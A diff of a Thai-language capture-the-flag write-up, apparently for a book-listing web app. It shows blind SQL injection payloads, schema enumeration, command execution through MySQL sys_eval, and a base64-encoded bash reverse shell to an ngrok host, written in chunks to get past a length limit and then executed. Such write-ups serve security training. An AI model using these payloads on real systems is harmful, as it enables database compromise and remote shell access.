@@ -40,7 +40,7 @@ dirsearch -u http://35.240.216.137/
 &nbsp;&nbsp;&nbsp;&nbsp;เริ่มต้นด้วยการทดสอบ SQL Injection แบบพื้นฐาน:
 
 &nbsp;&nbsp;&nbsp;&nbsp;- **ทดสอบ UNION-based Injection:**
-```sql
+```bash
 # ตัวอย่างคำสั่งไม่สำเร็จ:
 1 UNION SELECT 1,2,3--
 1' UNION SELECT 1,2,3,4--
@@ -48,7 +48,7 @@ dirsearch -u http://35.240.216.137/
 ```
 
 &nbsp;&nbsp;&nbsp;&nbsp;- **ทดสอบ Boolean-based Injection:**
-```sql
+```bash
 # ตัวอย่างคำสั่งสำเร็จ:
 1' AND '1' = '1' #  -- Returns true, แสดงรายการหนังสือของ ID 1
 1' AND '1' != '1' # -- Returns false, ไม่แสดงรายการหนังสือ
@@ -63,7 +63,7 @@ dirsearch -u http://35.240.216.137/
 #### 2. Blind SQL Injection
 &nbsp;&nbsp;&nbsp;&nbsp;- เมื่อพบว่าสามารถใช้ Boolean-based injection ได้ จึงปรับแต่ง payload สำหรับ Blind SQL Injection:
 
-```sql
+```bash
 # Base payload template:
 1' AND '{text}' = select substr(@@version,{index},1) #
 
@@ -79,7 +79,8 @@ dirsearch -u http://35.240.216.137/
 - `database()`: `book`
 
 &nbsp;&nbsp;&nbsp;&nbsp;- ทดสอบการทำ Schema enumeration พวก information_schema ,mysql , performance_schema , sys
-```sql
+
+```bash
 - 1' AND '{text}' = select substr(select group_concat(schema_name) from information_schema.schemata,{index},1) #
 - 1' AND '{text}' = select substr(select group_concat(table_name) from information_schema.tables,{index},1) #
 - 1' AND '{text}' = select substr(select group_concat(column_name) from information_schema.columns,{index},1) #
@@ -90,7 +91,7 @@ dirsearch -u http://35.240.216.137/
 ทำการตรวจสอบการตั้งค่า MySQL เพื่อหาช่องทางในการ exploit:
 
 **ผลลัพท์ของการตั้งค่าที่พบ**
-```sql
+```bash
 @@plugin_dir = '/usr/lib/mysql/plugin/'
 @@secure_file_priv = '/var/lib/mysql-files/'
 
@@ -117,7 +118,7 @@ dirsearch -u http://35.240.216.137/
 
 ทดสอบ command เพื่อ show ข้อมูล user
 
-```sql
+```bash
 # command execution payload:
 1' AND '{text}' = (select substr((select hex(select sys_eval('id'))),{index},1)) #
 
@@ -146,7 +147,7 @@ dirsearch -u http://35.240.216.137/
 - `echo` ไปเรื่อยๆ ยาวๆ ไป จนไม่สามารถใช้คำสั่ง echo ได้ แสดงว่า มีการ limit ความยาวของ payload ที่ส่งไปแน่ๆ
 
 - จึงทำการลดรูปของ query ลงซะ ตรงไหนไม่เว้นวรรคได้ ตัดวงเล็บเกินๆ ออก ก็จะเหลือแค่
-```sql
+```bash
 1' AND ''=(select sys_eval('<command>'))#
 ```
 
@@ -176,14 +177,14 @@ dirsearch -u http://35.240.216.137/
 
 2. **Generate Payload:**
    - ใช้ [revshells.com](https://www.revshells.com/) สร้าง payload
-
-<img src="./resources/58_2.png" alt="" style="width:80% !important;">
+   
+   <img src="./resources/58_2.png" alt="" style="width:90% !important;">
 
 #### 7. Payload Construction & Execution
 ขั้นตอนการสร้างและ execute reverse shell:
 
 - เนื่องจากถูก length limit ไว้ จึงต้องใช้วิธีการเขียนไฟล์ทีละส่วนแล้วค่อยรวมทีหลัง โดยจะให้ความยาวของ payload ไม่เกิน 65
-    ```sql
+    ```bash
     #ใช้ echo เขียนไฟล์ โดยใช้ชื่อไฟล์ a
 
     1 AND ''=(select sys_eval('echo${IFS}"/bin/bash -i "'>a))#
@@ -194,12 +195,12 @@ dirsearch -u http://35.240.216.137/
 
 - นำ payload ทั้งหมดไปทดสอบ แต่ปรากฎว่า payload บางอันใช้ไม่ได้ ทั้งที่ limit ความยาวแล้ว อาจจะมี filter อักขระอะไรอีกรึป่าว
 - จึงทำการเปลี่ยน command ใหม่ โดย encode command ในส่วนของ reverse shell เป็น base64 ก่อนเพื่อหลีกเลี่ยง special characters
-    ```sql
+    ```bash
     echo${IFS}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzAudGNwLmFwLm5ncm9rLmlvLzEzNzYwIDA+JjE=|bass64${IFS}-d|bash${IFS}-i
     ```      
 - เอา payload มาแบ่งส่วนเหมือนเดิม 
 
-    ```sql
+    ```bash
     #ใช้ echo เขียนไฟล์ โดยใช้ชื่อไฟล์ a
 
     1 AND ''=(select sys_eval('echo${IFS}"L2Jpbi9iYXNoIC1"'>a))#
@@ -212,7 +213,7 @@ dirsearch -u http://35.240.216.137/
 
 - เมื่อส่ง payload ทั้งหมดได้สำเร็จ ก็ลองไปอ่านไฟล์ `a` ที่เขียนไว้ ดูก่อน ปรากฎว่า มีไฟล์ถูกเขียนจริง แต่ข้อความติดกันหมดเลย
 
-    ```     
+    ```bash
     #ข้อความในไฟล์ติดกันหมด ไม่สามารถใช้ได้
     `echoL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzAudGNwLmFwLm5ncm9rLmlvLzEzNzYwIDA+JjE=|bass64-d|bash-i`
     ```
@@ -223,16 +224,16 @@ dirsearch -u http://35.240.216.137/
 
 
 - เมื่อส่ง payload ทั้งหมดแล้วก็ไปสั่ง decode ไฟล์ `a` ที่เป็น base64 กลับเป็นข้อความเดิม ด้วยคำสั่ง base64 -d แล้ว save เป็นไฟล์ใหม่ชื่อไฟล์ `b`
-    ```sql
+    ```bash
     1' AND ''=(select sys_eval('cat${IFS}a|base64${IFS}-d${IFS}>b'))#
     ```
 
 - เปลี่ยนสิทธิ์ของไฟล์ `b` ให้ execute ได้
-    ```sql
+    ```bash
     1' AND ''=(select sys_eval('chmod${IFS}+x${IFS}b'))#`
     ```
 - และสุดท้ายสั่ง execute ไฟล์ b เลย
-    ```sql
+    ```bash
     1' AND ''=(select sys_eval('./b'))#`
     ```
 สำเร็จ reverse shell ได้แล้ว ที่เหลือก็หาไฟล์ flag 
